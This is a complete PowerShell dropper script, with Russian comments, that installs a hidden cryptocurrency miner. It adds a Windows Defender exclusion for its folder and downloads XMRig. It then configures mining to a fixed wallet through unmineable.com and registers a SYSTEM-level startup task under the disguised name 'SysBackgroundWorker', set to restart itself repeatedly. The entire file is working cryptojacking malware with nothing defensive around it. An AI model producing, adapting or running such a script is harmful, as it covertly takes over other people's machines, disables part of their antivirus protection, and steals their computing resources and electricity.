$ScriptPath = "C:\ProgramData\SysWorker\molino.ps1"
New-Item -ItemType Directory -Path (Split-Path $ScriptPath) -Force | Out-Null

$ScriptContent = @'
# === НАСТРОЙКИ ===
$Coin = "USDT"
$Wallet = "0xbD4a36e73BDa8B0f50689d60528c698FA05b6005"
$RefCode = ""                          # Опционально: реф-код unMineable (снижает комиссию с 1% до 0.75%)
$Pool = "rx.unmineable.com:3333"
$MaxCpuUsage = 60                      # Процент потоков CPU (можно поменять под сервер)
$InstallDir = "C:\ProgramData\SysWorker"
$TaskName = "SysBackgroundWorker"
# =================

$ErrorActionPreference = "Stop"
$WorkerName = ($env:COMPUTERNAME -replace '[^a-zA-Z0-9_-]', '')

if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# 1. Исключение в Windows Defender ДО скачивания
try {
    Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue
} catch {}

# 2. Скачиваем XMRig для Windows x64
$XmrigVer = "6.22.2"
$ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v$XmrigVer/xmrig-$XmrigVer-msvc-win64.zip"
$ZipPath = "$InstallDir\xmrig.zip"
$TmpDir = "$InstallDir\tmp"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath
Expand-Archive -Path $ZipPath -DestinationPath $TmpDir -Force

$ExeFile = Get-ChildItem -Path $TmpDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
if (-not $ExeFile) {
    throw "Не найден xmrig.exe после распаковки архива."
}

Move-Item -Path $ExeFile.FullName -Destination "$InstallDir\xmrig.exe" -Force
Remove-Item -Path $TmpDir, $ZipPath -Recurse -Force

# 3. Формируем config.json в UTF-8 СТРОГО БЕЗ BOM
$UserString = "$Coin`:$Wallet.$WorkerName"
if ($RefCode -ne "") {
    $UserString = "$UserString#$RefCode"
}

$JsonConfig = @"
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "max-threads-hint": $MaxCpuUsage,
        "priority": 1
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "$Pool",
            "user": "$UserString",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ]
}
"@

$Utf8NoBom = New-Object System.Text.UTF8Encoding($false)
[System.IO.File]::WriteAllText("$InstallDir\config.json", $JsonConfig, $Utf8NoBom)

# 4. Пересоздаём и запускаем фоновую задачу в Task Scheduler
$Action = New-ScheduledTaskAction -Execute "$InstallDir\xmrig.exe" -Argument "-c config.json" -WorkingDirectory $InstallDir
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 0) -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)

Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
Start-ScheduledTask -TaskName $TaskName
Start-Sleep -Seconds 3

Write-Host "Готово. Воркер $WorkerName запущен в фоне." -ForegroundColor Green
Get-Process xmrig -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, CPU
Get-ScheduledTask -TaskName $TaskName | Get-ScheduledTaskInfo
'@

$Utf8NoBom = New-Object System.Text.UTF8Encoding($false)
[System.IO.File]::WriteAllText($ScriptPath, $ScriptContent, $Utf8NoBom)

& $ScriptPath
